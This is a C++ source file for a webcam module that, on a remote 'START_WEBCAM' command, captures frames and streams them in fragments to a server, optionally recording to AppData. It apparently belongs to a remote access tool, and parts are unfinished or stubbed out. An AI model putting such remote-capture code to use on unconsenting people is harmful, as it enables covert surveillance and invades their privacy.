#include "WebcamManager.h"

#include <utility>


// constructor -> information of recording and socket
WebcamManager::WebcamManager(ClientSocket &clientSocket)
        : Handler(clientSocket) {
    ActionMap& actionMap = clientSocket.getActionMap();
    actionMap["START_WEBCAM"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &WebcamManager::startWebcam,json);
    };
}

void WebcamManager::setConfiguration(nlohmann::json jsonObject) {
    std::string webcamName = jsonObject["selected_device"];
    channelID = jsonObject["channel_id"];
    webcamID = DeviceEnumerator::getIndexOfWebcamByName(webcamName);
    fragmented = jsonObject["is_fragmented"];
    FPS = jsonObject["fps"];
#ifdef WEBCAM
    locationOfVideos = Converter::string2wstring(WEBCAM);
    fileName = Install::getAppDataPath() +L"\\" + this->locationOfVideos + L"\\" +( fragmented ? L"fragmented_video_" : L"one_take_video_");
#endif
}

// sending all records available in path vector
void WebcamManager::sendRecord() {
    /*if (!fragmented) output.release();
    stream.sendSize(static_cast<int>(pathVector.size()));
    for (const auto &file: pathVector) {
        stream.sendFile(file.c_str());
        stream.readSize();
        std::filesystem::remove(file);
    }
    removeTempFiles();
    initialized=false;
    pathVector.clear();*/
}

// removing video temporary files
void WebcamManager::removeTempFiles(){
    for (const auto &file: pathVector){
        std::wcout << "To eleminate -> " << file << std::endl;
        std::filesystem::remove(file);
    }
}

const int FRAGMENT_SIZE = 64 * 1024; // 64 KB
const uint8_t LAST_FRAGMENT = 0x02;
const uint8_t NOT_LAST_FRAGMENT = 0x01;

void WebcamManager::sendFrame(const cv::Mat& frame) {
    // Codificar la imagen en un buffer
    std::vector<uchar> imageBuff;
    cv::imencode(".jpeg", frame, imageBuff);

    std::vector<uint8_t> buffer(FRAGMENT_SIZE);
    size_t bytesRead = 0;
    size_t totalSize = imageBuff.size();
    size_t offset = 0;

    // Suponiendo que fileID es definido en otro lugar

    while (totalSize > 0) {
        // Preparar los bytes de encabezado: 1 byte para el ID de archivo, 1 byte para el código de control
        buffer[0] = channelID;
        buffer[1] = NOT_LAST_FRAGMENT;

        // Calcular cuántos bytes leer para este fragmento
        if (totalSize >= FRAGMENT_SIZE - 2) {
            bytesRead = FRAGMENT_SIZE - 2;
        } else {
            bytesRead = totalSize;
            buffer[1] = LAST_FRAGMENT;
        }

        // Copiar los datos en el buffer, comenzando en el desplazamiento 2
        std::copy(imageBuff.begin() + offset, imageBuff.begin() + offset + bytesRead, buffer.begin() + 2);

        // Enviar el fragmento (Nota: Enviando bytesRead + 2 bytes para incluir los 2 bytes de control)
        clientSocket.sendBytes(std::vector<uint8_t>(buffer.begin(), buffer.begin() + bytesRead + 2));

        // Actualizar el desplazamiento y el tamaño total restante
        offset += bytesRead;
        totalSize -= bytesRead;
    }
}


// sending video capture dimensions to server
void WebcamManager::sendDimensions(int width,int height){
    //stream.sendSize(width);
    //stream.sendSize(height);
}


// starting webcam, sending information to server
void WebcamManager::startWebcam(nlohmann::json jsonObject) {
    setConfiguration(std::move(jsonObject));
    cv::Mat frame;
    cv::VideoCapture vid(webcamID);

    int frameWidth = (int) vid.get(cv::CAP_PROP_FRAME_WIDTH);
    int frameHeight = (int) vid.get(cv::CAP_PROP_FRAME_HEIGHT);

    //sendDimensions(frameWidth,frameHeight);


    boolean streamingState = true;
    while (streamingState) {
        vid >> frame;
        switch (23) { // save record and stop (no break keyword)
            case -2: {
                sendRecord();
            }
            case -1: { // stop streaming, stop loop
                std::cout << "stop streaming" << std::endl;
                if (initialized) {
                    output.release();
                    removeTempFiles();
                }
                streamingState=false;
                break;
            }
            case 1: {  // record case, continues sending information
                std::cout << "record" << std::endl;
                if (!initialized) {
                    std::wstring tempFileName = fileName;
                    tempFileName.append(TimeCS::getCurrentDateTimeW()).append(L".avi");
                    std::filesystem::path parentPath = std::filesystem::path(fileName).parent_path();
                    std::filesystem::create_directory(parentPath);
                    output = cv::VideoWriter(Converter::wstring2string(tempFileName), cv::VideoWriter::fourcc('M', 'J', 'P', 'G'), FPS,
                                             cv::Size(frameWidth, frameHeight));
                    pathVector.push_back(tempFileName);
                    initialized = true;
                }
                output.write(frame);
                sendFrame(frame);
                break;
            }
            case 2: { // stop recording, continue sending frames
                std::cout << "stop recording " << std::endl;
                if (fragmented) {
                    initialized = false;
                    output.release();
                }
                sendFrame(frame);
                break;
            }
            case 3: { // save recording (save and send), continue sending frames
                std::cout << "save recordings" << std::endl;
                sendRecord();
                sendFrame(frame);
                break;
            }
            default:{ // just send frame (no actions)
                sendFrame(frame);
                break;
            }

        }
        Sleep(100);
    }
    vid.release(); // release video
}



